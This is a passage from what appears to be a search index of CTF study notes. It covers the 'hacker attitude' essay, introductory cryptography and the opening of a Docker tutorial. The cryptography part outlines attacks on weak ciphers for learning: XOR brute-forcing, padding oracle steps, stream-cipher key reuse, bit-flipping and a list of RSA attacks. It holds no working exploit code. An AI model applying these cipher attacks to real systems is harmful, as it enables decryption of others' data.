made.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#misc-security-miscellaneous","title":"Misc - Security Miscellaneous","text":"<p>The topic \"Online Ghost: The Autobiography of Mitnick, the World's Number One Hacker\" translated by Zhuge Jianwei, and some typical MISC topics are used as entry points, mainly including information gathering, coding analysis, forensic analysis, steganography analysis, etc.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#how-to-become-a-hacker","title":"How To Become A Hacker","text":""},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#what-is-a-hacker","title":"What Is a Hacker?","text":"<p>The Jargon File contains a bunch of definitions of the term \u2018hacker\u2019, most having to do with technical adeptness and a delight in solving problems and overcoming limits. If you want to know how to become a hacker, though, only two are relevant.</p> <p>There is a community, a shared culture, of expert programmers and networking wizards that traces its history back through decades to the first time-sharing minicomputers and the earliest ARPAnet experiments. The members of this culture originated the term \u2018hacker\u2019. Hackers built the Internet. Hackers made the Unix operating system what it is today. Hackers make the World Wide Web work. If you are part of this culture, if you have contributed to it and other people in it know who you are and call you a hacker, you're a hacker.</p> <p>The hacker mindset is not confined to this software-hacker culture. Some people apply the hacker attitude to other things, like electronics or music \u2014 actually, you can find it at the highest levels of any science or art. Software hackers recognize these kindred spirits elsewhere and may call them \u2018hackers\u2019 too \u2014 and some claim that the hacker nature is independent of the particular medium the hacker works in. But in the rest of this document, we will focus on the skills and attitudes of software hackers, and the traditions of the shared culture that originated the term \u2018hacker\u2019.</p> <p>There is another group of people who loudly call themselves hackers, but aren't. These are people (mainly adolescent males) who get a kick out of breaking into computers and phreaking the phone system. Real hackers call these people \u2018crackers\u2019 and want nothing to do with them. Real hackers mostly think crackers are lazy, irresponsible, and not very bright, and object that being able to break security doesn't make you a hacker any more than being able to hotwire cars makes you an automotive engineer. Unfortunately, many journalists and writers have been fooled into using the word \u2018hacker\u2019 to describe crackers; this irritates real hackers no end.</p> <p>The basic difference is this: hackers build things, and crackers break them.</p> <p>If you want to be a hacker, keep reading. If you want to be a cracker, go read the alt.2600 newsgroup and get ready to do five to ten in the slammer after finding out you aren't as smart as you think you are. And that's all I'm going to say about crackers.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#the-hacker-attitude","title":"The Hacker Attitude","text":"<ul> <li> <ol> <li>The world is full of fascinating problems waiting to be solved.</li> </ol> </li> <li> <ol> <li>No problem should ever have to be solved twice.</li> </ol> </li> <li> <ol> <li>Boredom and drudgery are evil.</li> </ol> </li> <li> <ol> <li>Freedom is good.</li> </ol> </li> <li> <ol> <li>Attitude is no substitute for competence.</li> </ol> </li> </ul> <p>Hackers solve problems and build things, and they believe in freedom and voluntary mutual help. To be accepted as a hacker, you have to behave as though you have this kind of attitude yourself. And to behave as though you have the attitude, you have to really believe the attitude.</p> <p>But if you think of cultivating hacker attitudes as just a way to gain acceptance in the culture, you'll miss the point. Becoming the kind of person who believes these things are important for you \u2014 for helping you learn and keeping you motivated. As with all creative arts, the most effective way to become a master is to imitate the mindset of masters \u2014 not just intellectually but emotionally as well.</p> <p>Or, as the following modern Zen poem has it:</p> <p>To follow the path:   look to the master,   follow the master,   walk with the master,   see through the master,   become the master.</p> <p>So, if you want to be a hacker, repeat the following things until you believe them:</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#1-the-world-is-full-of-fascinating-problems-waiting-to-be-solved","title":"1. The world is full of fascinating problems waiting to be solved.","text":"<p>Being a hacker is lots of fun, but it's a kind of fun that takes lots of effort. The effort takes motivation. Successful athletes get their motivation from a kind of physical delight in making their bodies perform, and in pushing themselves past their physical limits. Similarly, to be a hacker you have to get a basic thrill from solving problems, sharpening your skills, and exercising your intelligence.</p> <p>If you aren't the kind of person that feels this way naturally, you'll need to become one to make it as a hacker. Otherwise, you'll find your hacking energy is sapped by distractions like sex, money, and social approval.</p> <p>(You also have to develop a kind of faith in your own learning capacity \u2014 a belief that even though you may not know all of what you need to solve a problem, if you tackle just a piece of it and learn from that, you'll learn enough to solve the next piece \u2014 and so on, until you're done.)</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#2-no-problem-should-ever-have-to-be-solved-twice","title":"2. No problem should ever have to be solved twice.","text":"<p>Creative brains are a valuable, limited resource. They shouldn't be wasted on re-inventing the wheel when there are so many fascinating new problems waiting out there.</p> <p>To behave like a hacker, you have to believe that the thinking time of other hackers is precious \u2014 so much so that it's almost a moral duty for you to share information, solve problems and then give the solutions away just so other hackers can solve new problems instead of having to perpetually re-address old ones.</p> <p>Note, however, that \"No problem should ever have to be solved twice.\" does not imply that you have to consider all existing solutions sacred, or that there is only one right solution to any given problem. Often, we learn a lot about the problem that we didn't know before by studying the first cut at a solution. It's OK, and often necessary, to decide that we can do better. What's not OK is artificial technical, legal, or institutional barriers (like closed-source code) that prevent a good solution from being re-used and force people to re-invent wheels.</p> <p>(You don't have to believe that you're obligated to give all your creative product away, though the hackers that do are the ones that get the most respect from other hackers. It's consistent with hacker values to sell enough of it to keep you in food and rent and computers. It's fine to use your hacking skills to support a family or even get rich, as long as you don't forget your loyalty to your art and your fellow hackers while doing it.)</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#3-boredom-and-drudgery-are-evil","title":"3. Boredom and drudgery are evil.","text":"<p>Hackers (and creative people in general) should never be bored or have to drudge at stupid repetitive work because when this happens it means they aren't doing what only they can do \u2014 solve new problems. This wastefulness hurts everybody. Therefore boredom and drudgery are not just unpleasant but evil.</p> <p>To behave like a hacker, you have to believe this enough to want to automate away the boring bits as much as possible, not just for yourself but for everybody else (especially other hackers).</p> <p>(There is one apparent exception to this. Hackers will sometimes do things that may seem repetitive or boring to an observer as a mind-clearing exercise, to acquire a skill or have some particular kind of experience you can't have otherwise. But this is by choice \u2014 nobody who can think should ever be forced into a situation that bores them.)</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#4-freedom-is-good","title":"4. Freedom is good.","text":"<p>Hackers are naturally anti-authoritarian. Anyone who can give you orders can stop you from solving whatever problem you're being fascinated by \u2014 and, given the way authoritarian minds work, will generally find some appallingly stupid reason to do so. So the authoritarian attitude has to be fought wherever you find it, lest it smothers you and other hackers.</p> <p>(This isn't the same as fighting all authority. Children need to be guided and criminals restrained. A hacker may agree to accept some kind of authority to get something he wants more than the time he spends following orders. But that's a limited, conscious bargain; the kind of personal surrender authoritarians want is not on offer.)</p> <p>Authoritarians thrive on censorship and secrecy. And they distrust voluntary cooperation and information-sharing \u2014 they only like the \u2018cooperation\u2019 that they control. So to behave like a hacker, you have to develop an instinctive hostility to censorship, secrecy, and the use of force or deception to compel responsible adults. And you have to be willing to act on that belief.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#5-attitude-is-no-substitute-for-competence","title":"5. Attitude is no substitute for competence.","text":"<p>To be a hacker, you have to develop some of these attitudes. But copping an attitude alone won't make you a hacker, any more than it will make you a champion athlete or a rock star. Becoming a hacker will take intelligence, practice, dedication, and hard work.</p> <p>Therefore, you have to learn to distrust attitudes and respect competence of every kind. Hackers won't let posers waste their time, but they worship competence \u2014 especially competence at hacking, but competence at anything is valued. Competence at demanding skills that few can master is especially good, and competence at demanding skills that involve mental acuteness, craft, and concentration is best.</p> <p>If you revere competence, you'll enjoy developing it in yourself \u2014 the hard work and dedication will become a kind of intense play rather than drudgery. That attitude is vital to becoming a hacker.</p>"},{"location":"CTF/Cryptography/","title":"Cryptography","text":"<p>https://ctf101.org/cryptography/overview/</p> <p>Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes that are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code.</p> <p>The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis.</p>"},{"location":"CTF/Cryptography/#what-is-cryptography-used-for","title":"What is cryptography used for?","text":"<p>Uses in everyday software</p> <ul> <li>Securing web traffic (passwords, communication, etc.)</li> <li>Securing copyrighted software code</li> </ul> <p>Malicious uses</p> <ul> <li>Hiding malicious communication</li> <li>Hiding malicious code</li> </ul>"},{"location":"CTF/Cryptography/#topics","title":"Topics","text":"<ul> <li>XOR</li> <li>Cesear Cipher</li> <li>Substitution Cipher</li> <li>Vigenere Cipher</li> <li>Hashing Functions</li> <li>Block Ciphers</li> <li>Stream Ciphers</li> <li>RSA</li> </ul>"},{"location":"CTF/Cryptography/#xor","title":"XOR","text":""},{"location":"CTF/Cryptography/#data-representation","title":"Data Representation","text":"<p>Data can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them</p> <p></p>"},{"location":"CTF/Cryptography/#xor-basics","title":"XOR Basics","text":"<p>An XOR or eXclusive OR is a bitwise operation indicated by <code>^</code> and shown by the following truth table:</p> A B A ^ B 0 0 0 0 1 1 1 0 1 1 1 0 <p>So what XOR'ing bytes in the action <code>0xA0 ^ 0x2C</code> translates to is:</p> 1 0 1 0 0 0 0 0 0 0 1 0 1 1 0 0 1 0 0 0 1 1 0 0 <pre><code>0b10001100` is equivalent to `0x8C`, a cool property of XOR is that it is reversible meaning `0x8C ^ 0x2C = 0xA0` and `0x8C ^ 0xA0 = 0x2C\n</code></pre> <p></p>"},{"location":"CTF/Cryptography/#what-does-this-have-to-do-with-ctf","title":"What does this have to do with CTF?","text":"<p>XOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example:</p> <pre><code>&gt;&gt;&gt; data = 'CAPTURETHEFLAG'\n&gt;&gt;&gt; key = 'A'\n&gt;&gt;&gt; encrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data])\n&gt;&gt;&gt; encrypted\n'\\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06'\n&gt;&gt;&gt; decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in encrypted])\n&gt;&gt;&gt; decrypted\n'CAPTURETHEFLAG'\n</code></pre> <p>This can be extended using a multibyte key by iterating in parallel with the data.</p>"},{"location":"CTF/Cryptography/#exploiting-xor-encryption","title":"Exploiting XOR Encryption","text":""},{"location":"CTF/Cryptography/#single-byte-xor-encryption","title":"Single Byte XOR Encryption","text":"<p>Single Byte XOR Encryption is trivial to bruteforce as there are only 255 key combinations to try.</p>"},{"location":"CTF/Cryptography/#multibyte-xor-encryption","title":"Multibyte XOR Encryption","text":"<p>Multibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the English alphabet than others.</p>"},{"location":"CTF/Cryptography/#substitution-cipher","title":"Substitution Cipher","text":"<p>A Substitution Cipher is a system of encryption where different symbols substitute a normal alphabet.</p> <p></p>"},{"location":"CTF/Cryptography/#caesar-cipherrot-13","title":"Caesar Cipher/ROT 13","text":"<p>The Caesar Cipher or Caesar Shift is a cipher that uses the alphabet to encode texts.</p> <pre><code>CAESAR` encoded with a shift of 8 is `KIMAIZ` so `ABCDEFGHIJKLMNOPQRSTUVWXYZ` becomes `IJKLMNOPQRSTUVWXYZABCDEFGH\n</code></pre> <p>ROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts.</p> <p></p>"},{"location":"CTF/Cryptography/#vigenere-cipher","title":"Vigenere Cipher","text":"<p>A Vigenere Cipher is an extended Caesar Cipher where a message is encrypted using various Caesar-shifted alphabets.</p> <p>The following table can be used to encode a message:</p> <p></p>"},{"location":"CTF/Cryptography/#encryption","title":"Encryption","text":"<p>For example, encrypting the text <code>SUPERSECRET</code> with <code>CODE</code> would follow this process:</p> <ol> <li><code>CODE</code> gets padded to the length of <code>SUPERSECRET</code> so the key becomes <code>CODECODECOD</code></li> <li>For each letter in <code>SUPERSECRET</code> we use the table to get the Alphabet to use, in this instance row <code>C</code> and column <code>S</code></li> <li>The ciphertext's first letter then becomes <code>U</code></li> <li>We eventually get <code>UISITGHGTSW</code></li> </ol>"},{"location":"CTF/Cryptography/#decryption","title":"Decryption","text":"<ol> <li>Go to the row of the key, in this case, <code>C</code></li> <li>Find the letter of the cipher text in this row, in this case <code>U</code></li> <li>The column is the first letter of the decrypted ciphertext, so we get <code>S</code></li> <li>After repeating this process we get back to <code>SUPERSECRET</code></li> </ol>"},{"location":"CTF/Cryptography/#hashing-functions","title":"Hashing Functions","text":"<p>Hashing functions are one-way functions that theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have collisions or two different pieces of data which produce the same supposed unique output.</p>"},{"location":"CTF/Cryptography/#string-hashing","title":"String Hashing","text":"<p>A string hash is a number or string generated using an algorithm that runs on text or data.</p> <p>The idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes.</p> <p>You can use command line tools or online resources such as this one. Example: <code>$ echo -n password | md5 5f4dcc3b5aa765d61d8327deb882cf99</code> Here, \u201cpassword\u201d is hashed with different hashing algorithms:</p> <ul> <li>SHA-1: 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8</li> <li>SHA-2: 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8</li> <li>MD5: 5F4DCC3B5AA765D61D8327DEB882CF99</li> <li>CRC32: BBEDA74F</li> </ul> <p>Generally, when verifying a hash visually, you can simply look at the first and last four characters of the string.</p>"},{"location":"CTF/Cryptography/#file-hashing","title":"File Hashing","text":"<p>A file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change.</p> <p>What is it used for? - File and data identification - Password/certificate storage comparison</p> <p>How can we determine the hash of a file? You can use the md5sum command (or similar).</p> <pre><code>$ md5sum samplefile.txt\n3b85ec9ab2984b91070128be6aae25eb samplefile.txt\n</code></pre>"},{"location":"CTF/Cryptography/#hash-collisions","title":"Hash Collisions","text":"<p>A collision is when two pieces of data or text have the same cryptographic hash. This is very rare.</p> <p>What\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes on a computer since it\u2019s hard to get the passwords from hashes.</p> <p></p> <p>If you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password.</p> <p>Two different files on the same hard drive with the same cryptographic hash can be very interesting.</p> <p>\u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d said Peter Selinger of Dalhousie University. \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d</p> <p>For example, he cited this famous pair:</p> <p></p> <p>and</p> <p></p> <p>Each of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4.</p> <p>Selinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d</p> <p>Ben Laurie has a nice website that visualizes this MD5 collision. For a non-technical, though slightly outdated, introduction to hash functions, see Steve Friedl\u2019s Illustrated Guide. And here\u2019s a good article from DFI News that explores the same topic.</p>"},{"location":"CTF/Cryptography/#block-ciphers","title":"Block Ciphers","text":"<p>A Block Cipher is an algorithm that is used in conjunction with a cryptosystem to package a message into evenly distributed 'blocks' which are encrypted one at a time.</p>"},{"location":"CTF/Cryptography/#definitions","title":"Definitions","text":"<ul> <li>Mode of Operation: How a block cipher is applied to an amount of data that exceeds a block's size</li> <li>Initialization Vector (IV): A sequence of bytes that is used to randomize encryption even if the same plaintext is encrypted</li> <li>Starting Variable (SV): Similar to the IV, except it is used during the first block to provide a random seed during encryption</li> <li>Padding: Padding is used to ensure that the block sizes all line up and ensure the last block fits the block cipher</li> <li>Plaintext: Unencrypted text; Data without obfuscation</li> <li>Key: A secret used to encrypt plaintext</li> <li>Ciphertext: Plaintext encrypted with a key</li> </ul>"},{"location":"CTF/Cryptography/#common-block-ciphers","title":"Common Block Ciphers","text":"Mode Formulas Ciphertext ECB Yi = F(PlainTexti, Key) Yi CBC Yi = PlainTexti XOR Ciphertexti-1 F(Y, key); Ciphertext0 = IV PCBC Yi = PlainTexti XOR (Ciphertexti-1 XOR PlainTexti-1) F(Y, key); Ciphertext0 = IV CFB Yi = Ciphertexti-1 Plaintext XOR F(Y, key); Ciphertext0 = IV OFB Yi = F(Key, Ii-1);Y0=IV Plaintext XOR Yi CTR Yi = F(Key, IV + g(i));IV = token(); Plaintext XOR Yi <p>Note</p> <p>In this case, <code>i</code> represents an index over the # of blocks in the plaintext. F() and g() represent the function used to convert plaintext into ciphertext.</p>"},{"location":"CTF/Cryptography/#electronic-codebook-ecb","title":"Electronic Codebook (ECB)","text":"<p>ECB is the most basic block cipher, it simply chunks up plaintext into blocks and independently encrypts those blocks, and chains them all into a ciphertext.</p> <p> </p>"},{"location":"CTF/Cryptography/#flaws","title":"Flaws","text":"<p>Because ECB independently encrypts the blocks, patterns in data can still be seen clearly, as shown in the CBC Penguin image below.</p> Original Image ECB Image Other Block Cipher Modes"},{"location":"CTF/Cryptography/#cipher-block-chaining-cbc","title":"Cipher Block Chaining (CBC)","text":"<p>CBC is an improvement upon ECB where an Initialization Vector is used to add randomness. The encrypted previous block is used as the IV for each sequential block meaning that the encryption process cannot be parallelized. CBC has been declining in popularity due to a variety of</p> <p> </p> <p>Note</p> <p>Even though the encryption process cannot be parallelized, the decryption process can be parallelized. If the wrong IV is used for decryption it will only affect the first block as the decryption of all other blocks depends on the ciphertext not the plaintext.</p>"},{"location":"CTF/Cryptography/#propagating-cipher-block-chaining-pcbc","title":"Propagating Cipher Block Chaining (PCBC)","text":"<p>PCBC is a less-used cipher that modifies CBC so that decryption is also not parallelizable. It also cannot be decrypted from any point as changes made during the decryption and encryption process \"propagate\" throughout the blocks, meaning that both the plaintext and ciphertext are used when encrypting or decrypting as seen in the images below.</p> <p> </p>"},{"location":"CTF/Cryptography/#counter-ctr","title":"Counter (CTR)","text":"<p>Note</p> <p>The counter is also known as CM, integer counter mode (ICM), and segmented integer counter (SIC)</p> <p>CTR mode makes the block cipher similar to a stream cipher and it functions by adding a counter with each block in combination with a nonce and key to XOR the plaintext to produce the ciphertext. Similarly, the decryption process is the same except instead of XORing the plaintext, the ciphertext is XORed. This means that the process is parallelizable for both encryption and decryption and you can begin from anywhere as the counter for any block can be deduced easily.</p> <p> </p>"},{"location":"CTF/Cryptography/#security-considerations","title":"Security Considerations","text":"<p>If the nonce chosen is non-random, it is important to concatenate the nonce with the counter (high 64 bits to the nonce, low 64 bits to the counter) as adding or XORing the nonce with the counter would break security as an attacker can cause a collision with the nonce and counter. An attacker with access to providing a plaintext, nonce, and counter can then decrypt a block by using the ciphertext as seen in the decryption image.</p>"},{"location":"CTF/Cryptography/#padding-oracle-attack","title":"Padding Oracle Attack","text":"<p>A Padding Oracle Attack sounds complex but essentially means abusing a block cipher by changing the length of input and being able to determine the plaintext.</p>"},{"location":"CTF/Cryptography/#requirements","title":"Requirements","text":"<ul> <li>An oracle, or program, which encrypts data using CBC</li> <li>Continual use of the same key</li> </ul>"},{"location":"CTF/Cryptography/#execution","title":"Execution","text":"<ol> <li>If we have two blocks of ciphertext, C1, and C2, we can get the plaintext P2</li> <li>Since we know that CBC decryption is dependent on the prior ciphertext if we change the last byte of C1 we can see if C2 has the correct padding</li> <li>If it is correctly padded we know that the last byte of the plaintext</li> <li>If not, we can increase our byte by one and repeat until we have a successful padding</li> <li>We then repeat this for all successive bytes following C1 and if the block is 16 bytes we can expect a maximum of 4080 attempts which is trivial</li> </ol>"},{"location":"CTF/Cryptography/#stream-ciphers","title":"Stream Ciphers","text":"<p>A Stream Cipher is used for symmetric key cryptography, or when the same key is used to encrypt and decrypt data. Stream Ciphers encrypt pseudorandom sequences with bits of plaintext to generate ciphertext, usually with XOR. A good way to think about Stream Ciphers is to think of them as generating one-time pads from a given state.</p>"},{"location":"CTF/Cryptography/#definitions_1","title":"Definitions","text":"<ul> <li>A keystream is a sequence of pseudorandom digits that extend to the length of the plaintext to uniquely encrypt each character based on the corresponding digit in the keystream</li> </ul>"},{"location":"CTF/Cryptography/#one-time-pads","title":"One-Time Pads","text":"<p>A one-time pad is an encryption mechanism whereby the entire plaintext is XOR'd with a random sequence of numbers to generate a random ciphertext. The advantage of the one-time pad is that it offers an immense amount of security BUT for it to be useful, the randomly generated key must be distributed on a separate secure channel, meaning that one-time pads have little use in modern-day cryptographic applications on the internet. Stream ciphers extend upon this idea by using a key, usually 128-bit in length, to seed a pseudorandom keystream which is used to encrypt the text.</p>"},{"location":"CTF/Cryptography/#types-of-stream-ciphers","title":"Types of Stream Ciphers","text":""},{"location":"CTF/Cryptography/#synchronous-stream-ciphers","title":"Synchronous Stream Ciphers","text":"<p>A Synchronous Stream Cipher generates a keystream based on internal states not related to the plaintext or ciphertext. This means that the stream is generated pseudorandomly outside of the context of what is being encrypted. A binary additive stream cipher is the term used for a stream cipher in which XOR's the bits with the bits of the plaintext. Encryption and decryption require that the synchronous state cipher is in the same state, otherwise, the message cannot be decrypted.</p>"},{"location":"CTF/Cryptography/#self-synchronizing-stream-ciphers","title":"Self-synchronizing Stream Ciphers","text":"<p>A Self-synchronizing Stream Cipher, also known as an asynchronous stream cipher or ciphertext autokey (CTAK), is a stream cipher that uses the previous N digits to compute the keystream used for the next N characters.</p> <p>Note</p> <p>Seems a lot like block ciphers doesn't it? That's because block cipher feedback mode (CFB) is an example of a self-synchronizing stream cipher.</p>"},{"location":"CTF/Cryptography/#stream-cipher-vulnerabilities","title":"Stream Cipher Vulnerabilities","text":""},{"location":"CTF/Cryptography/#key-reuse","title":"Key Reuse","text":"<p>The key tenet of using stream ciphers securely is to NEVER repeat key use because of the commutative property of XOR. If C1 and C2 have been XOR'd with a key K, retrieving that key K is trivial because C1 XOR C2 = P1 XOR P2, and having an English language-based XOR means that cryptoanalysis tools such as a character frequency analysis will work well due to the low entropy of the English language.</p>"},{"location":"CTF/Cryptography/#bit-flipping-attack","title":"Bit-flipping Attack","text":"<p>Another key tenet of using stream ciphers securely is considering that just because a message has been decrypted, it does not mean the message has not been tampered with. Because decryption is based on state, if an attacker knows the layout of the plaintext, a Man in the Middle (MITM) attack can flip a bit during transit altering the underlying ciphertext. If a ciphertext decrypts to 'Transfer $1000', then a middleman can flip a single bit for the ciphertext to decrypt to 'Transfer $9000' because changing a single character in the ciphertext does not affect the state in a synchronous stream cipher.</p>"},{"location":"CTF/Cryptography/#rsa","title":"RSA","text":"<p>RSA, which is an abbreviation of the author's name (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem that allows for asymmetric encryption. Asymmetric cryptosystems are also commonly referred to as Public Key Cryptography where a public key is used to encrypt data and only a secret, a private key can be used to decrypt the data.</p>"},{"location":"CTF/Cryptography/#definitions_2","title":"Definitions","text":"<ul> <li>The Public Key is made up of (n, e)</li> <li>The Private Key is made up of (n, d)</li> <li>The message is represented as m and is converted into a number</li> <li>The encrypted message or ciphertext is represented by c</li> <li>p and q are prime numbers which make up n</li> <li>e is the public exponent</li> <li>n is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA)</li> <li>d is the private exponent</li> <li>The totient \u03bb(n) is used to compute d and is equal to the lcm(p-1, q-1), another definition for \u03bb(n) is that \u03bb(pq) = lcm(\u03bb(p), \u03bb(q))</li> </ul>"},{"location":"CTF/Cryptography/#what-makes-rsa-viable","title":"What makes RSA viable?","text":"<p>If public n, public e, private d are all very large numbers and a message m holds true for 0 &lt; m &lt; n, then we can say:</p> <p>(m^e)d \u2261 m (mod n)</p> <p>Note</p> <p>The triple equals sign in this case refers to modular congruence which in this case means that there exists an integer k such that (m^e)d = kn + m</p> <p>RSA is viable because it is incredibly hard to find d even with m, n, and e because factoring large numbers is an arduous process.</p>"},{"location":"CTF/Cryptography/#implementation","title":"Implementation","text":"<p>RSA follows 4 steps to be implemented: 1. Key Generation 2. Encryption 3. Decryption</p>"},{"location":"CTF/Cryptography/#key-generation","title":"Key Generation","text":"<p>We are going to follow Wikipedia's small numbers example to make this idea a bit easier to understand.</p> <p>Note</p> <p>In This example, we are using Carmichael's totient function where \u03bb(n) = lcm(\u03bb(p), \u03bb(q)), but Euler's totient function is perfectly valid to use with RSA. Euler's totient is \u03c6(n) = (p \u2212 1)(q \u2212 1)</p> <ol> <li>Choose two prime numbers such as:</li> <li>p = 61 and q = 53</li> <li>Find n:</li> <li>n = pq = 3233</li> <li>Calculate \u03bb(n) = lcm(p-1, q-1)</li> <li>\u03bb(3233) = lcm(60, 52) = 780</li> <li>Choose a public exponent such that 1 &lt; e &lt; \u03bb(n) and is coprime (not a factor of) \u03bb(n). The standard in most cases is 65537, but we will be using:</li> <li>e = 17</li> <li>Calculate d as the modular multiplicative inverse or in English find d such that: <code>de mod \u03bb(n) = 1</code></li> <li>d * 17 mod 780 = 1</li> <li>d = 413</li> </ol> <p>Now we have a public key of (3233, 17) and a private key of (3233, 413)</p>"},{"location":"CTF/Cryptography/#encryption_1","title":"Encryption","text":"<p>With the public key, m can be encrypted trivially</p> <p>The ciphertext is equal to me mod n or:</p> <p>c = m^17 mod 3233</p>"},{"location":"CTF/Cryptography/#decryption_1","title":"Decryption","text":"<p>With the private key, m can be decrypted trivially as well</p> <p>The plaintext is equal to cd mod n or:</p> <p>m = c^413 mod 3233</p>"},{"location":"CTF/Cryptography/#exploitation","title":"Exploitation","text":"<p>From the RsaCtfTool README</p> <p>Attacks:</p> <ul> <li>Weak public key factorization</li> <li>Wiener's attack</li> <li>Hastad's attack (Small public exponent attack)</li> <li>Small q (q &lt; 100,000)</li> <li>Common factor between ciphertext and modulus attack</li> <li>Fermat's factorization for close p and q</li> <li>Gimmicky Primes method</li> <li>Past CTF Primes method</li> <li>Self-Initializing Quadratic Sieve (SIQS) using Yafu</li> <li>Common factor attacks across multiple keys</li> <li>Small fractions method when p/q is close to a small fraction</li> <li>Boneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d &lt; n^0.292)</li> <li>Elliptic Curve Method</li> <li>Pollards p-1 for relatively smooth numbers</li> <li>Mersenne primes factorization</li> </ul>"},{"location":"CTF/Docker/","title":"Docker for beginners","text":"<p>https://docker-curriculum.com/</p> <p>by Prakhar Srivastav</p>"},{"location":"CTF/Docker/#introduction","title":"Introduction","text":""},{"location":"CTF/Docker/#what-is-docker","title":"What is Docker?","text":"<p>Wikipedia defines Docker as</p> <p>an open-source project that automates the deployment of software applications inside containers by providing an additional layer of abstraction and automation of OS-level virtualization on Linux.</p> <p>Wow! That's a mouthful. In simpler words, Docker is a tool that allows developers, sys-admins, etc. to easily deploy their applications in a sandbox (called containers) to run on the host operating system i.e. Linux. The key benefit of Docker is that it allows users to package an application with all of its dependencies into a standardized unit for software development. Unlike virtual machines, containers do not have high overhead and hence enable more efficient usage of the underlying system and resources.</p>"},{"location":"CTF/Docker/#what-are-containers","title":"What are containers?","text":"<p>The industry standard today is to use Virtual Machines (VMs) to run software applications. VMs run applications inside a guest Operating System, which runs on virtual hardware powered by the server\u2019s host OS.</p> <p>VMs are great at providing full process isolation for applications: there are very few ways a problem in the host operating system can affect the software running in the guest operating system, and vice-versa. But this isolation comes at a great cost \u2014 the computational overhead spent virtualizing hardware for a guest OS to use is substantial.</p> <p>Containers take a different approach: by leveraging the low-level mechanics of the host operating system, containers provide most of the isolation of virtual machines at a fraction of the computing power.</p>"},{"location":"CTF/Docker/#why-use-containers","title":"Why use containers?","text":"<p>Containers offer a logical packaging mechanism in which applications can be abstracted from the environment in which they run. This decoupling allows container-based applications to be deployed easily and consistently, regardless of whether the target environment is a private data center, the public cloud, or even a developer\u2019s laptop. This gives developers the ability to create predictable environments that are isolated from the rest of the applications and can be run anywhere.</p> <p>From an operations standpoint, apart from portability containers also give more granular control over resources giving your infrastructure improved efficiency which can result in better utilization of your compute resources.</p> <p></p> <p>Google Trends for Docker</p> <p>Due to these benefits, containers (&amp; Docker) have seen widespread adoption. Companies like Google, Facebook, Netflix, and Salesforce leverage containers to make large engineering teams more productive and to improve the utilization of computing resources. Google credited containers for eliminating the need for an entire data center.</p>"},{"location":"CTF/Docker/#what-will-this-tutorial-teach-me","title":"What will this tutorial teach me?","text":"<p>This tutorial aims to be the one-stop shop for getting your hands dirty with Docker. Apart from demystifying the Docker landscape, it'll give you hands-on experience building and deploying your web apps on the Cloud. We'll be using Amazon Web Services to deploy a static website, and two dynamic web apps on EC2 using Elastic Beanstalk and Elastic Container Service. Even if you have no prior experience with deployments, this tutorial should be all you need to get started.</p>"},{"location":"CTF/Docker/#getting-started","title":"GETTING STARTED","text":"<p>This document contains a series of several sections, each of which explains a particular aspect of Docker. We will be typing commands (or writing code) in each section. All the code used in the tutorial is available in the GitHub repo.</p> <p>Note: This tutorial uses version 18.05.0-ce of Docker. If you find any part of the tutorial incompatible with a future version, please raise an issue. Thanks!</p>"},{"location":"CTF/Docker/#prerequisites","title":"Prerequisites","text":"<p>There are no specific skills needed for this tutorial beyond a basic comfort with the command line and using a text editor. This tutorial uses <code>git clone</code> to clone the repository locally. If you don't have Git installed on your system, either install it or remember to manually download the zip files from Github. Prior experience in developing web applications will be helpful but is not required. As we proceed further along the tutorial, we'll make use of a few cloud services. If you're interested in following along, please create an account on each of these websites:</p> <ul> <li>Amazon Web Services</li> <li>Docker Hub</li> </ul>"},{"location":"CTF/Docker/#setting-up-your-computer","title":"Setting up your computer","text":"<p>Getting all the tooling setup on your computer can be a daunting task, but thankfully as Docker has become stable, getting Docker up and running on your favorite OS has become very easy.</p> <p>Until a few releases ago, running Docker on OSX and Windows was quite a hassle. Lately however, Docker has invested significantly into improving the on-boarding experience for its users 